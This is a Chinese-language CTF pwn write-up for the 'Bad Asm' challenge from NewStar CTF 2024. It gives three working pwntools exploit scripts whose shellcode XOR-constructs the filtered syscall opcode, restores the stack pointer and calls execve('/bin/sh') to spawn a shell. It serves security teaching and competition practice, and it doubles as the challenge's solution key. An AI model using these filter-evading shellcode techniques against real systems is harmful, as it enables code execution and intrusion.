# Bad Asm

> 分类：Pwn

## 题目描述
程序过滤 `syscall` / `sysenter` / `int 0x80` 的汇编指令的机器码。`strcpy` 限制了 shellcode 的机器码中不能出现 `0x00`。开启的可执行段具有写权限，需要手动构造 shellcode。

## 考察知识点
- shellcode 编写
- syscall 机器码过滤绕过（异或/拆分）
- rsp/rbp 恢复
- `execve("/bin/sh", 0, 0)` 构造

## 解法
用异或搓出来 syscall 的机器码之后用 `mov` 写入到 shellcode 后面，中间用 `nop` 连接。由于程序清空了 `rsp` `rbp` 寄存器，需要恢复一下 `rsp` 的值（任意一个可读写段即可），否则 `push` 操作会出问题。

EXP（方法一，两次输入）：

```python
# sudo sysctl -w kernel.randomize_va_space=0
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

ELFpath = './pwn'
p=remote('???.???.???.???', ?????)

shellcode='''
; // 目标: 使用 syscall 执行 read(0, code, 0x3fff)
mov rsp, rdi
mov rax, rdi
add sp, 0x0848 ; // 给 rsp 一个合法值，使 push/pop 能正常执行

mov rsi,rdi
mov dx, 0x3fff ; // 设置 rsi rdx 寄存器

mov cx, 0x454f
xor cx, 0x4040 ; // 异或搓出来 0f 05 (syscall 的机器码)
add al, 0x40
mov [rax], cx  ; // 写入 syscall，拼接到当前 shellcode 后面

xor rdi, rdi
xor rax, rax   ; // 设置 read 的系统调用号 0
'''
p.sendafter("Input your Code :", asm(shellcode).ljust(0x40, b'\x90'))

pause()
p.send(b'a'*0x42+asm(shellcraft.sh()))
p.interactive()
```

方法二（直接异或构造 execve）：

```python
shellcode='''
mov rsp, rdi
add sp, 0x0848
mov rsi, 0x4028636f2e49226f
mov rdx, 0x4040104040204040
xor rsi, rdx
push rsi       ; // 异或搓出 '/bin/sh\x00' 并 push 到栈上

mov ax, 0x454f
xor ax, 0x4040
mov rsi, rdi
add sil, 0x40
mov [rsi], ax  ; // 搓出 syscall 机器码并拼接到 shellcode 后

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 59
'''
p.sendafter("Input your Code :", asm(shellcode).ljust(0x40, b'\x90'))
p.interactive()
```

方法三（push syscall + jmp rsp）：

```python
shellcode='''
mov rsp, rdi
add sp, 0x0848
mov rsi, 0x4028636f2e49226f
mov rdx, 0x4040104040204040
xor rsi, rdx
push rsi

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 59

mov cx, 0xf5ff
xor cx, 0xf0f0 ; // 异或拿到 syscall 机器码
push rcx
jmp rsp
'''
p.sendafter("Input your Code :", asm(shellcode))
p.interactive()
```

另外，题目检查 syscall 时检测相邻两个字节，也可以把两个字节分别用 `mov byte ptr` 写入内存，拆开 `0x0f 0x05`，绕过检查。

## 参考答案
flag 未在 writeup 中给出（获取 shell 后读取）。

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/pwn/bad-asm.html
